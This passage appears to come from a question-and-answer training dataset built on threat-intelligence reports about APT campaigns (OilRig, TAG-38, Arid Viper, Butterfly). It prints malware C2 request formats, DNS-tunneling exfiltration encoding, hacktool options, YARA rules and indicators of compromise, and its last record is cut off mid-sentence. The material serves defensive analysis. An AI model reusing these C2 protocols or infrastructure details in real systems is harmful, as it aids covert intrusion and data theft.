    "instruction": "Answer based on context:\n\n[random 4 digits]ID[unique identifier]-[number of DNS queries needed]-[string of hexadecimal bytes for sent data]-[string of hexadecimal bytes for filename being sent].prosalar[.]com\nFor example, figure 4 is the first DNS query issued after our testing system ran the _DnsInit.bat script provided by the C2 server mentioned above. As you can see, each DNS request can only send 10 bytes of data at a time, requiring 29 outbound requests to transmit the 289 bytes of output that was generated by the batch script.\nAs you can surmise, ALMA Communicator's C2 channel is rather limited when it comes to data transfer. If an actor wished to use ALMA communicator to exfiltrate large files, it would result in a very large number of outbound DNS requests, as each outbound request can only send 10 bytes at a time. Even more limiting is the data transmission from the C2 server to the Trojan, which can only send 4 bytes per DNS request, as each IPv4 address is treated as data. We believe this is the reason why the Clayslide delivery document saved the Mimikatz tool to the system instead of having the actor download the tool to the system after a successful compromise. Based on the 4-byte per DNS request limitation, the ALMA Communicator would generate 189,568 DNS requests (not including the start and stop requests) to transmit the 758,272 byte Mimikatz tool to the system, which may be detected by security systems or personnel.\nConclusion\nThe OilRig threat group continues to use their Clayslide delivery document in their attack campaigns. The current variant of Clayslide also suggests that this group continues to develop these delivery documents with new installation techniques to evade detection. This threat group also continues to add new payloads to their toolset as well, with ALMA Communicator being the most recent addition. Lastly, it appears that OilRig still prefers using DNS tunneling for its C2 channel of choice, as ALMA Communicator, Helminth and ISMAgent all use this technique for C2 communications.\nPalo Alto Networks customers are protected by the following:\nWildFire identifies ClaySlide delivery documents and ALMA Communicator samples as malicious\nTraps blocks the ALMA Communicator Trojan via Local Analysis and blocks the Clayslide delivery document based on \"Suspicious macro detected\"\nAutoFocus customers can track these tools using the following tags:\nIndicators of Compromise f37b1bbf5a07759f10e0298b861b354cee13f325bc76fbddfaacd1ea7505e111 (Clayslide) 2fc7810a316863a5a5076bf3078ac6fad246bc8773a5fb835e0993609e5bb62e (ALMA Communicator)\n2d6f06d8ee0da16d2335f26eb18cd1f620c4db3e880efa6a5999eff53b12415c (Mimikatz) prosalar[.]com\n\nHow does the ALMA Communicator Trojan handle data transmission through DNS tunneling, and what are the implications for exfiltrating large amounts of data?",
    "output": "The ALMA Communicator Trojan uses DNS tunneling for its C2 communications, where each DNS request can only send 10 bytes of data at a time. This means that exfiltrating large amounts of data would require a very high number of outbound DNS requests. For example, sending 289 bytes of output from a batch script required 29 DNS requests. This limitation makes the ALMA Communicator less suitable for exfiltrating large files, as the sheer volume of DNS requests could alert security systems or personnel to the unusual activity.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 5.1 Attribution and Cyber Crime / Cyber Espionage\nDuring this investigation we collected malware samples used by the attackers, which were primarily PDFs that exploited vulnerabilities in Adobe Acrobat and Adobe Reader. In addition, we collected malware used by the attackers after successfully compromising a targeted system as well as network traffic captured from the OHHDL. We were able to map out the command and control infrastructure of the attackers and in several cases view data that allowed us to identify targets that had been compromised and recover exfiltrated documents. We did not have access to data regarding specific attacks on any of the targets we have identified. In other words, we cannot definitely tell how any one individual target was compromised. And, more importantly, we do not have data regarding the behaviour of the attackers once inside the target's network.\nHowever, we do have two key pieces of information: the first is an email address used in a document in the attackers' possession that provided steps on how the attackers could use Yahoo! Mail as a command and control server; the second is the IP addresses used by the attackers to send emails from Yahoo! Mail accounts used as command and control servers.\nEmail addresses used by the attackers have proven to provide critical clues in past investigations. Following the release of the GhostNet investigation, The Dark Visitor \u2014 a blog that researches Chinese hacking activities \u2014 investigated one of the email addresses we published that was used to register the domain names the attackers utilized as command and control servers. While these were not GhostNet domain names, one of them is the same as one used by the attackers in this investigation: lookbytheway.net (Henderson 2009a).\nThe email address used to register lookbytheway.net is losttemp33@hotmail.com. The Dark Visitor found forum posts made by losttemp33@hotmail.com, who also used the alias \"lost33.\" Further searching revealed \"an individual who was associated with Xfocus, Isbase,\" two popular Chinese hacking forums, and \"seems to have studied under Glacier\" (Henderson 2009b). Glacier is known as \"Godfather of the Chinese Trojan\" (Henderson 2007a), and an association with him indicates lost33's connections to the hacking underground in the PRC. Using information found on lost33's blog, The Dark Visitor was able to find another blog used by lost33, now operating under the alias \"damnfootman\", and had a text chat conversation with him on the Chinese instant messenger service QQ, where the individual admitted to being the owner of the email address losttemp33@hotmail.com.\nFrom this information, The Dark Visitor was able to determine this individual has connections to the forums of Xfocus and Isbase (the Green Army), NSfocus and Eviloctal, as well as connections to the hackers Glacier and Sunwear. He was born on July 24, 1982, lives in Chengdu, Sichuan, and attended the University of Electronic Science and Technology of China, which is also located in Chengdu.\nOur investigation also indicated strong links to Chengdu, Sichuan. The attacker used Yahoo! Mail accounts as command and control servers, from which the attacker sent emails containing new malware to the already compromised targets. All of the IP addresses the attacker used when sending these emails are located in Chengdu, Sichuan.\nWe were able to retrieve a document from the attackers that indicated the steps neccessary to use Yahoo! Mail accounts as command and control servers. There was also an account used by the attackers in this document for testing purposes. Searches for this email address returned several advertisements for apartment rentals in Chengdu, Sichuan.\nThe infrastructure of this particular network is tied to individuals in Chengdu, Sichuan. At least one of these individuals has ties to the underground hacking community in the PRC and to the University of Electronic Science and Technology of China in Chengdu. Interestingly, when the Honker Union of China, one of the largest hacking groups in the PRC, was re-established in 2005, its new leader was a student at the University of Electronic Science and Technology in Chengdu. Chengdu is also the location of one of the People's Liberation Army (PLA)'s technical reconnaissance bureaus tasked with signals intelligence collection. While it would be disingenuous to ignore these correlations entirely, they are loose at best and certainly do not meet the requirements of determining motivation and attribution. However, the links between the command and control infrastructure and individuals in the PRC provide a variety of scenarios that point toward attribution.\n\nBased on the above text, answer a question. What are the potential implications of the attackers' infrastructure being tied to individuals in Chengdu, Sichuan, and how does this relate to the broader context of the Chinese hacking community and military operations?",
    "output": "The infrastructure of the attackers' network being tied to individuals in Chengdu, Sichuan, suggests potential connections to the underground hacking community in the PRC and the University of Electronic Science and Technology of China in Chengdu. Notably, when the Honker Union of China, one of the largest hacking groups in the PRC, was re-established in 2005, its new leader was a student at the University of Electronic Science and Technology in Chengdu. Additionally, Chengdu is the location of one of the People's Liberation Army (PLA)'s technical reconnaissance bureaus tasked with signals intelligence collection. While these correlations are intriguing, they do not definitively prove motivation or attribution. However, they provide various scenarios that point toward possible attribution, highlighting the complexity of determining the origins and motives behind such attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Threat Analysis\nSince at least September 2021, we have observed TAG-38 intrusions targeting the identified victim organizations. The group has employed probable compromised infrastructure for command and control of ShadowPad implants used to target the identified networks, as well as using the open source tool . Figure 3 highlights ongoing TAG-38 C2 detection and network traffic analysis exfiltration events from victim networks within the Recorded Future platform between September 2021 and March 2022.\nMedium Headline: Targeting of Indian Power Sector\nThe identified victimology within this latest campaign is confined to Indian targets, specifically at least 7 SLDCs, the Indian subsidiary of a multinational logistics company, and a national emergency response system. As shown in Figure 4, the identified SLDCs were all located in Northern India, in proximity to the disputed China-India border in Ladakh. SLDCs are responsible for carrying out real-time operations for grid control and electricity dispatch within these respective states, similar to the Regional Load Despatch Centres (RLDCs) previously targeted in reported RedEcho . This makes these organizations critical for maintaining grid frequency and stability, with SLDCs maintaining access to supervisory control and data acquisition (SCADA) systems present across respective states for the purpose of grid control and electricity dispatch. At this time, we have not observed evidence of access to industrial control system (ICS) environments in this activity.\nMedium Headline: TAG-38 Infrastructure Clustering\nUsing a combination of proactive infrastructure detection techniques and network traffic analysis, we uncovered a cluster of C2 infrastructure engaged in this prolonged targeting of Indian critical infrastructure over several months. Based on our analysis, the adversary infrastructure cluster identified consists entirely of likely compromised internet-facing, third-party DVR/ IP camera devices. The compromise of often poorly secured internet-of-things (IOT) devices such as IP cameras for use in follow-on intrusion activity has previously been seen for threats ranging from Mirai-based botnets (,) to the Chinese state-sponsored threat RedBravo (APT31/ZIRCONIUM). At this time, we have not determined the means in which these devices were originally compromised, which may include the use of default credentials. Using a series of analytical techniques and heuristics, we were able to cluster a network of these C2 IPs together, all of which matched all or most of the following criteria:\n\u2022 Victim infrastructure observed communicating to all of the identified C2 servers consisted solely of the same overlapping Indian power grid victims, logistics company, and Indian emergency response system.\n\u2022 All C2 servers were likely compromised DVR/IP camera devices and were primarily geolocated in Taiwan or South Korea.\n\u2022 Likely compromised devices were observed with the default open ports 80/554/9090 associated with the compromised device, as well as an additional actor-controlled port(s) opened for malware C2 communications.\n\u2022 A large proportion were confirmed as ShadowPad C2 servers using Recorded Future C2 detection methodologies, a technique previously used in historical Insikt Group reporting on RedEcho and other Chinese state-sponsored activity groups (,,).\n\u2022 A large proportion of the identified C2s had the open source tool  server component configured on port 8443. FRP can read predefined configurations and allows you to expose local services that are hidden behind the NAT or a firewall to the internet. This tool has been abused by numerous state-sponsored groups, including the  and several Chinese actors (,).\n\u2022 A large proportion of the identified C2s shared a unique SSL certificate spoofing Microsoft on port 443 (SHA1 fingerprint: 0f6afc6e4e383883a6308fcf8d84b14a5bf4ccaf). This certificate has multiple links to wider Chinese state-sponsored cyber espionage activity and is discussed in further detail below.\nMedium Headline: Overlaps With Other China-Nexus Threat Activity\nWhile investigating the TAG-38 intrusion activity, we uncovered multiple links to other suspected Chinese state-sponsored activity. Of note, the targeting and use of ShadowPad is consistent with previously reported RedEcho activity, and this latest activity also includes a repeated SLDC victim. However, there were distinct differences in the infrastructure TTPs used in this latest campaign, and at this time we have not identified sufficient technical evidence tying these 2 activity groups together beyond the common targeting sets and capability use.\nThe use of a shared SSL certificate (SHA1 fingerprint 0f6afc6e4e383883a6308fcf8d84b14a5bf4ccaf) exhibited on several TAG-38 servers was also notable. This SSL certificate was also identified historically on a few dozen other servers with links to Chinese cyber espionage activity. For example, one of the IP addresses historically exhibiting this certificate, 185.243.41[.]240, concurrently hosted several domains attributed to the group we track as TAG-26 referenced earlier in this report (including supership.dynv6[.]net, supermarket.ownip[.]net, and greatsong.soundcast[.]me). At this time, we believe it is unlikely that the use of this certificate is exclusive to a single activity group. This is based on wider context such as differing targeting patterns, infrastructure TTPs, and capability use linked to the infrastructure historically sighted exhibiting this certificate, which may instead be indicative of a shared capability.\nFigure 6: Shared SSL certificate linked to TAG-38 and wider Chinese cyber espionage activity\nQ: How does TAG-38 utilize compromised infrastructure for command and control (C2) of ShadowPad implants, and what specific techniques do they employ to cluster this infrastructure?",
    "output": "TAG-38 employs compromised infrastructure for C2 of ShadowPad implants by utilizing likely compromised internet-facing, third-party DVR/IP camera devices. These devices are often poorly secured and may have been compromised through methods such as default credentials. To cluster this infrastructure, TAG-38 uses a combination of proactive infrastructure detection techniques and network traffic analysis. The clustered C2 IPs match criteria such as victim infrastructure communicating solely with the same overlapping Indian power grid victims, logistics company, and Indian emergency response system. Additionally, these C2 servers are primarily geolocated in Taiwan or South Korea and exhibit specific open ports and configurations indicative of malware C2 communications.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Summary\nA journalist at (<http://chinadigitaltimes.net/>)China Digital Times (CDT), (an independent Chinese and English language news portal), receives an email from a source claiming to have a tip on a sensitive story: \"I have insider information that is different from what you've published\". The email includes a link to an article from the news portal. Clicking on the link displays the article with a pop-up message asking the journalist to enter their username and password in prompt designed to look like a WordPress login page. What is normally a routine interaction for the journalist has become increasingly threatening. The tip from the source is actually an attempt to steal the journalist's WordPress credentials used to manage and publish content to the news portal.\nThe rouse used in the phishing email was clever, but it did not work. The journalist was immediately suspicious of the phishing attempts and shared them with researchers at the Citizen Lab to analyze, which led to the discovery of a wider campaign targeting Chinese language news sites using various tactics including reconnaissance, phishing, (<http://mingjingnews.com/>)and malware. The campaign used domains and copied content that masqueraded as , Mingjing News, , and . It is not clear if these other news groups were directly targeted. These organizations often report on issues that are politically sensitive to the government of China and their websites are blocked in the country. Our analysis of the infrastructure used in this campaign reveals connections to previous malware operations targeting Tibetan journalists and the Thai government. These incidents includes targets that are generally within the geopolitical interest of the government of China. However, this report does not conclusively attribute the campaign to a publicly reported threat actor or state sponsor.\nThere are numerous incidents of journalists and news organizations reporting on China being targeted by digital\nespionage operations. In 2009, as part of the (<https://citizenlab.ca/wp-content/uploads/2017/05/ghostnet.pdf>)GhostNet investigation, Citizen Lab found that China-based operators had infiltrated the mail servers of Associated Press offices in London and Hong Kong. Another (<https://www.nartv.org/2009/09/28/targeted-malware-attack-on-foreign-correspondent%E2%80%99s-based-in-china/>)investigation in 2009, by Nart Villeneuve and Greg Walton uncovered a targeted malware campaign against China-based journalists working at Reuters, the Straits Times, Dow Jones, Agence France Presse, and Ansa. In recent years other major news organizations, including the (<http://www.nytimes.com/2013/01/31/technology/chinese-hackers-infiltrate-new-york-times-computers.html>)The New York Times, the (<https://www.wsj.com/articles/SB10001424127887323926104578276202952260718>)Wall Street Journal, and the (<https://www.washingtonpost.com/business/technology/hackers-break-into-washington-post-servers/2013/12/18/dff8c362-682c-11e3-8b5b-a77187b716a3_story.html?utm_term=.97c39e270cc4>)Washington Post, have reported intrusions of their networks and systems by China-based operators. In each incident, the operators were suspected to be sponsored by the government of China with the motivation of gathering information on China-related reporting that the newspapers were covering.\nThese historical incidents and the campaign we analyze in this report serve as a general reminder that the media are targets for digital espionage and, as a result, news organizations and journalists need to reflect on their business practices and behaviours and adopt a more systematic approach to information security.\nThis report proceeds in five parts outlined below:\nAnswer this question: What broader implications does the campaign analyzed in the Citizenlab_Campaign-Chinese-language-news-sites(07-05-2017) report have for news organizations and journalists, particularly those reporting on politically sensitive topics related to China?",
    "output": "The campaign analyzed in the report highlights that journalists and news organizations, especially those reporting on politically sensitive topics related to China, are frequent targets of digital espionage operations. The campaign used various tactics including reconnaissance, phishing, and malware, and targeted Chinese language news sites. Historical incidents, such as the GhostNet investigation and targeted malware campaigns against major news organizations, further emphasize the ongoing threat. This serves as a reminder that news organizations and journalists need to adopt a more systematic approach to information security, reflecting on their business practices and behaviors to protect themselves from such threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Targets\nThreat intelligence from within Trend Micro was used to determine who the targets of an ongoing campaign dubbed \"Operation Arid Viper\" have been so far. Based on IP addresses associated with malware infections tied to the campaign's core infrastructure, we were able to determine its targets\u2014a government office, transport service/infrastructure providers, a military organization, and an academic institution in Israel. It also targeted an academic institution in Kuwait along with several other unidentified Israeli individuals.\nResearch also revealed an interesting Twitter conversation between @Ramzi_MHADHBI, a Tunisian blogger, and @waleedassar, a reverse engineer currently working as a senior security researcher at the Al Jazeera Media Network. Their exchange mentioned two of the domains associated with Operation Arid Viper malware, suggesting that one or both of them may have also been targeted.\nOperation Arid Viper targeted various Israeli organizations across industries.\nSmall Headline: Infection Chain\nAs will be made clear later, Operation Arid Viper aimed to extract victim information though it also paid much attention to its means of getting into target systems. The campaign used the most popular targeted attack infection vector\u2014a simple phishing email from a nonexistent sender to a specific recipient. It targeted organizations from various industries with a clear focus on Israel.\nThe spear-phishing email came with a compressed file attachment and a more or less credible social engineering ploy to trick victims into opening it and running the embedded .EXE file. The .RAR file attachment contains an .SCR file that when executed drops two more files onto an infected system. One file is a short pornographic video in .FLV or .MPG format, depending on the samples seen. The other file is a Windows\u00ae binary file sporting the icon of the well-known Internet communication program, Skype\u2122.\nTwitter conversation between @Ramzi_MHADHBI and @waleedassar\nOperation Arid Viper was unusual in that it had a pornographic component in hopes of taking user focus away from the infection or the fact that something strange is happening. It targeted professionals who might be receiving very inappropriate content at work and so would hesitate to report the incident. These victims' failure to act on the threat could have then allowed the main malware to remain undiscovered. The attackers used a distinct and likely successful strategy previously unseen when it came to avoiding incident response team investigations.\nIt is also worth mentioning that variations in the spear-phishing elements were seen across attacks though the idea behind them was the same. They all used a socially engineered email with a malicious file attachment and had a pornographic element as shown in the infection chain.\nOnce executed, the binary accesses a command-and-control (C&C) server to immediately download an updated module and check if the infected system is already known or if it has been newly infected. Each infected system is assigned a unique identifier comprising its hard disk name and a specific set of numbers. Specific URLs are used for command and control. Note how often the unique identifier is used in all kinds of communication with C&C servers. Below are sample commands for a system with the unique ID, VMwareVirtualIDEHardDrive\u20141268730784.\n\u2022 /session/aadd_rtemp. php?n=VMwareVirtualIDEHardDrive\u20141268730784: To add the system's record or perhaps start a communication session.\n\u2022 /session/gget_rtemp. php?n=VMwareVirtualIDEHardDrive\u20141268730784: To get a record or perhaps continue a communication session.\n\u2022 /flupdate/3.html: To download an updated .EXE file.\nOperation Arid Viper infection chain\nIncidentally, even though the file that should be downloaded\u20143.html\u2014 was hard-coded into the original malicious binary, the C&C server has sequentially numbered similar though not identical binaries such as 1.html, 2.html, and so on. These varied from sample to sample but were all Base64-encoded strings.\nThe malware also commonly set the User-Agent for communication to \"SK,\" \"Skypee,\" or \"Skype\" as shown in the Wireshark log.\nThe previously mentioned paths\u2014 aadd_temp and gget_rtemp\u2014varied a little from sample to sample and C&C server to C&C server but the request formatting was the same. A nonexhaustive list of other paths seen include:\nUser-Agent Wireshark log for \"SK,\" \"Skypee,\" or \"Skype\" communication\n\u2022 /new/add_tree.php?name=[SYSTEM-ID]&date=[TODAYS DATE]\n\u2022 /new/all_file_info1.php?name=[SYSTEMID]&user=[NUM]&file=[DD-MM-YYYY HH-MM. uml]&type=msn\n\u2022 /new/all_file_info1.php?name=[SYSTEMID]&user=[NUM]&file=[DD-MM-YYYY HH-MM. rml]&type=log\n\u2022 /new/all_file_info1.php?name=[SYSTEMID]&user=[NUM]&file=[DD-MM-YYYY HH-MM. dll]&type=img\n\u2022 /new/all_file_info1.php?name=[SYSTEMID]&user=[NUM]&file=[DD-MM-YYYY HH-MM. rml]&type=tree\n\u2022 /new/get_flash.php?name=[SYSTEM-ID]&serial=[SERIAL NUM]\n\u2022 /new/get_tree.php?name=[SYSTEM-ID]&date=[DD-MM-YYYY]\n\u2022 /new/get_statu.php?name=[SYSTEM-ID]\n\u2022 /new/view_flash_files.php?name=[SYSTEM-ID]&serial=[SERIAL NUM]\n\u2022 /new/view_flash_random. php?name=[SYSTEM-ID]&serial=[SERIAL NUM]\n\u2022 /new/update.php\n\u2022 /new/view_file_order.php?name=[SYSTEM-ID]\n\u2022 /new/view_file_up.php?name=[SYSTEM-ID]\n\u2022 /new/view_random_order. php?name=[SYSTEM-ID]\n\u2022 /down/add_temp.php?name= [SYSTEM-ID]\n\u2022 /new/add_tuser.php?name=[SYSTEM-ID]&use\n\u2022 /new/chang_flag.php\n\u2022 /new/chang_rfflag.php\n\u2022 /new/chang_rflag.php\n\u2022 /new/n_chang_fflag.php\n\u2022 /mians/aadd_rtemp.php?n=[SYSTEM-ID]\n\u2022 /mians/gget_rtemp.php?n=[SYSTEM-ID]\n\u2022 /session/aadd_rtemp.php?n=[SYSTEM-ID]\n\u2022 /session/gget_rtemp.php?n=[SYSTEM-ID]\nWhen the second-stage malware runs, it sets itself to auto-run with each system reboot in the guise of an Internet communication software. This is accomplished with an old-fashioned auto-start registry key such as HKCU\\SOFTWARE\\ Microsoft\\Windows\\CurrentVersion\\Run\u2014\"Skype = <path\\ name.exe\">. This keeps the path and name of the .EXE file dropped into the registry key. It also copies itself into %SystemDrive%\\Program Files\\Messenger via a hard-coded path. In addition to using \"Skype\" in the registry, the malware also frequently spoofed the Skype icon. All of the malware samples seen had portable executable (PE) file sections written in Arabic.\nThe malware logs in to the C&C console by calling a very specific PHP script on the C&C server\u2014/products/add_user.ph p?name=VMwareVirtualIDEHardDrive\u20141268730784&user=38. The number it creates for the user parameter\u201438 in the example\u2014was chosen from the malware client to identify the session. It then starts searching the whole hard disk for documents\u2014.DOC, .XLS, .PPT, and .TXT files. Each document found is reported to the C&C server using the format, GET / products/file_order3.php?name=VMwareVirtualIDEHardDri ve\u20141268730784&path=C:/Documents%20and%20Settings/\nThe Wireshark log (top) shows the files the malware sends to a C&C server. The assembly code section (bottom) searches for .XLS files to steal.\nThe C&C server immediately responds if each document is interesting or not. This decision probably comes from a hard-coded black list on the server side to likely prevent the client from sending out default templates and generic readme.txt files. The server also tries to avoid requesting for duplicates of files it already has in further stealing sessions. It has two possible responses:\n\u2022 Response for an interesting document:\nHTTP/1.1 200 OK\nbwlimited/1.4 X-Powered-By: PHP/5.5.16\nTransfer-Encoding: chunked\nContent-Type: text/html\n4\n6\ndone\n0\nContent-Type: text/html\n2 2\nThe client then proceeds to list down all of the interesting documents to steal. These are compressed in a 0.txt file and uploaded to a C&C server via a POST request such as POST /products/fupdates.php. This request comprises a single POST parameter formatted as a GET parameter such as account=38&name=VMwareVirtualIDEHardD rive\u20141268730784&folder=tree&fname=02-10-2014 10-50.rml&s=<base64-file>.\nThe server presumably uses the account value, which is the same as the previously mentioned user value, to track sessions where particular files are uploaded. The fname parameter is the .ZIP file's name and contains a specific date and time. The 0.txt file is deleted after the upload.\nAt the end of the file upload, the client issues the request, /products/all_file_info1.ph p?name=VMwareVirtualIDEHardDrive\u20141268730784&user=38&file=02-10-2014%20 10-50.rml&type=tree, to make sure everything went smoothly.\nAs shown, a single execution allows the malware client to steal documents from infected systems. After carrying out all of its routines, the malware routinely checks back with the C&C server to see if it should continue running using the path, /products/get_statu.php?name=VMwareVirtualIDEHardDrive\u20141268730784. A response containing run11 tells it to continue running whereas stop disables it to possibly avoid infecting uninteresting systems.\n\nBased on the above text, answer a question. What role do the C&C servers play in the infection chain of Operation Arid Viper, and how do they manage the communication with infected systems?",
    "output": "The C&C servers in Operation Arid Viper play a crucial role in managing the communication with infected systems. Once the initial malware is executed, it accesses a C&C server to download an updated module and check if the infected system is already known or newly infected. Each infected system is assigned a unique identifier comprising its hard disk name and a specific set of numbers. The C&C server uses this unique identifier in all communications to manage the infected systems effectively. Specific URLs are used for command and control, such as adding the system's record, starting a communication session, and downloading updated binaries. The malware also sets the User-Agent for communication to 'SK,' 'Skypee,' or 'Skype' to mimic legitimate traffic. The C&C server decides whether each document found on the infected system is interesting or not, preventing the client from sending out default templates and duplicates.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Very Small Headline: Hacktool.Eventlog\nThe following information details the help output of Hacktool.Eventlog:\n-z  Zap (kill) all processes with specified name\n-y Dump logon/logoff events from Security channel (-t and -n optionals)\n-X Secure self delete our program\n-x Secure delete a file\n-w Show all logs from a .evtx file (requires -f)\n-v Enable verbose mode\n-t Delta time (in hours\n-s Dump logon/logoff events from System channel (-t and -n optionals)\n-r RecordIds list, comma separated without spaces (\"1234,5678\")\n-q Query Mode\n-p Filter with provider\n-n Number of events to show (default 16, 0=all)\n-ll List all channels\n-l List used channels\n-K Match a keyword in XML data (case insensitive) from all channels\n-k Match a keyword in XML data (case insensitive) from a specific channel\n-h Help\n-f Specify a .evtx file (system.evtx)\n-F Flush all logs to disk\n-e EventIds list, comma separated without spaces (\"1234,5678\")\n-Dr Dump all logs from a channel or .evtx file (raw parser) (-c or -f)\n-D Dump all logs from a channel .evtx file (requires -c or -f)\n-d Delete mode (requires -e or -r)\n-c Specify a channel ('Security', 'System', 'Application', ...)\nSmall Headline: YARA signatures\nThe following details are the YARA signatures related to this analysis:\nrule Bannerjack\n{\nmeta:         author = \"Symantec Security Response\"        date = \"2015-07-01\"         description = \"Butterfly BannerJack hacktool\"\nstrings:        $str\n_ 1 = \"Usage: ./banner-jack [options]\"        $str _ 2 = \"-f: file.csv\"\n$str _ 3 = \"-s: ip start\"        $str _ 4 = \"-R: timeout read (optional, default %d secs)\"\ncondition:         all of them\n}\nrule Eventlog {     meta:         author = \"Symantec Security Response\"         date = \"2015-07-01\"         description = \"Butterfly Eventlog hacktool\"     strings:\n$str _ 1 = \"wevtsvc.dll\"\n$str _ 2 = \"Stealing %S.evtx handle ...\"\n$str _ 3 = \"ElfChnk\"\n{\nmeta:         author = \"Symantec Security Response\"         date = \"2015-07-01\"         description = \"Butterfly proxy hacktool\"\nstrings:\n$str _ 1 = \"-u user  : proxy username\"\n$str _ 2 = \"--pleh\n: displays help\"\n$str _ 3 = \"-x ip/host : proxy ip or host\"\n$str _ 4 = \"-m\n: bypass mutex check\"\ncondition:         all of them\n}\nrule jiripbot _ ascii _ str _ decrypt\n{\nmeta:         author = \"Symantec Security Response\" \"        date = \"2015-07-01         description = \"Butterfly Jiripbot hacktool\"\nstrings:\n$decrypt _ func = {            85 FF\n75 03\n33 C0\nC3\n8B C7\n8D 50 01\n8A 08\n40            84 C9\n75 F9\n2B C2\n53\n8B D8\n80 7C 3B FF ??\n75 3E\n83 3D ?? ?? ?? ?? 00            56\nBE ?? ?? ?? ??\n75 11            56\nFF 15 ?? ?? ?? ??\nC7 05 ?? ?? ?? ?? 01 00 00 00\n56\nFF 15 ?? ?? ?? ??\n33 C0\n85 DB\n74 09\n80 34 38 ??            40\n3B C3\n72 F7            56\nFF 15 ?? ?? ?? ??\n5E\n}\nSmall Headline: C&C server details\nThe following IP addresses were used for C&C traffic using SSH over port 443:\n\u2022 46.183.217.132\n\u2022 46.165.237.75\n\u2022 217.23.3.112\n\u2022 178.162.197.9\nThe following C&C servers were used by Backdoor.Jiripbot and OSX.Pintsized:\n\u2022 ddosprotected.eu\n\u2022 drfx.chickenkiller.com\nThe following C&C domains were used by Butterfly-related back doors. They were also used to host exploits over HTTP:\n\u2022 digitalinsight-ltd.com\n\u2022 clust12-akmai.net\n\u2022 jdk-update.com\n\u2022 corp-aapl.com\n\u2022 cloudprotect.eu\nThe following shows the format of Backdoor.Jiripbot's DGA domains:\n\u2022 jdk\\.[a-f0-9]{32}\\.org e.g. jdk.20e8ad99287f7fc244651237cbe8292a.org\nSmall Headline: About Symantec\nSymantec Corporation (NASDAQ: SYMC) is an information protection expert that helps people, businesses and governments seeking the freedom to unlock the opportunities technology brings -- anytime, anywhere. Founded in April 1982, Symantec, a Fortune 500 company, operating one of the largest global data-intelligence networks, has provided leading security, backup and availability solutions for where vital information is stored, accessed and shared. The company's more than 19,000 employees reside in more than 50 countries. Ninety-nine percent of Fortune 500 companies are Symantec customers. In fiscal 2015, it recorded revenues of $6.5 billion.\nwww.symantec.com\nTo learn more go to  or connect with\ngo.symantec.com/social/\nSymantec at: .\nBig Headline: For specific country offices and contact numbers, please visit our website.\nSymantec World Headquarters 350 Ellis St.\nMountain View, CA 94043 USA\n+1 (650) 527-8000\n1 (800) 721-3934\nwww.symantec.com\nCopyright \u00a9 2015 Symantec Corporation. All rights reserved. Symantec, the Symantec Logo, and the Checkmark Logo are trademarks or registered trademarks of Symantec Corporation or its affiliates in the U.S. and other countries. Other names may be trademarks of their respective owners.\nAny technical information that is made available by Symantec Corporation is the copyrighted work of Symantec Corporation and is owned by Symantec Corporation.\nNO WARRANTY . The technical information is being delivered to you as is and Symantec Corporation makes no warranty as to its accuracy or use. Any use of the technical documentation or the information contained herein is at the risk of the user. Documentation may include technical or other inaccuracies or typographical errors. Symantec reserves the right to make changes without prior notice.\n\nQuestion: What are the primary functionalities of the YARA signatures provided for identifying Butterfly-related hacktools, and how do these signatures help in detecting and mitigating threats?\n\nAnswer:",
    "output": "The YARA signatures provided for identifying Butterfly-related hacktools include rules for detecting tools like Bannerjack, Eventlog, and Jiripbot. Each rule contains specific strings and conditions that match the unique characteristics of these tools. For example, the 'Bannerjack' rule looks for strings like 'Usage: ./banner-jack [options]' and '-f: file.csv'. These signatures help in detecting and mitigating threats by allowing security analysts to scan systems and files for the presence of known malicious tools. By identifying these tools, security teams can quickly respond to and remediate the threats posed by Butterfly, thereby protecting sensitive information and intellectual property.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 2 Russian Cyber Strategy\nToday, how is this Clausewitzian-inspired Russian strategic imagination being applied to the use of cyber power? The answer can be found by first exploring the strategic challenge they apparently believe they face: the NATO alliance. NATO is based on the concept of collective defence that enhances its strategy of deterrence. Through formal agreements and long-standing and extensive collaboration, NATO sends a strong signal that member states will stand together in the face of threats to collectively deter aggression against its members. The objective of this deterrent policy is to preserve the peace. This is a key observation. The goal of NATO's deterrent strategy is to reduce or even eliminate the possibility of war by ensuring that aggressors understand ex ante that an attack against one of its members is an attack against the entire Alliance. Especially today, NATO primarily exists to prevent war, not to develop enhanced strategies or capabilities to prosecute war or to wield forces to achieve ancillary objectives. In a sense, NATO exists to preserve the peace and to make sure that changes to the status quo in Europe occur through political processes that lead to the spread of democracy, the rule of law, and adherence to international norms. The raison d'\u00eatre of NATO is to preserve the peace; the purpose behind its strategy is to deter war.\nRussia opted to pick a course of action not to defeat NATO, but NATO's strategy.\nTo achieve its objective \u2013 rapid change of the European status quo to better fit their Russia-centric, not democratically-cantered, interests and preferences \u2013 Russia opted to pick a course of action not to defeat NATO, but to defeat NATO's strategy. By presenting the Western alliance with a fait accompli through actions that produce minimal death and destruction, Russia attempted to shift the onus of escalation onto NATO, thereby inflicting a strategic defeat on the Alliance at the outset of hostilities or even in the event of non-democratic changes to the status quo. Russia is banking on the hope that NATO will either be incapable or unwilling to transform this strategic defeat into active conventional combat, which would further undermine NATO's goal of preserving the peace. In effect, the Russians seem to have realised that by defeating NATO's strategy at the outset of a confrontation, they can actually alter political perceptions within the Alliance in a way that suits their objectives. Put somewhat differently, the risk of a forceful NATO response to some provocation is minimised by keeping the death and destruction associated with any fait accompli to an absolute minimum. NATO is especially vulnerable to cyberattacks and information warfare because Russia can undermine NATO's deterrent strategy without causing casualties. NATO has the option of reversing the fait accompli, but the required level of death and destruction simply highlights the failure of its deterrent strategy.\nCyber power, as a key facet of hybrid warfare, is an important enabler in an attack on NATO's deterrent strategy.12 Cyber attacks are not specifically targeted to eliminate key nodes, but to intensify the fog of war by sowing confusion within command and control networks and NATO polities. For instance, according to press reports, Russian movement into the Ukraine was accompanied by myriad cyber attacks, including Distributed Denial of Service (DDoS) tactics against computers in Kyiv, Poland, the European Parliament, and the European Commission.13 If local political and military leaders cannot develop an accurate estimate of quickly developing events, critical hours or even days can be gained with which Russia can create facts on the ground 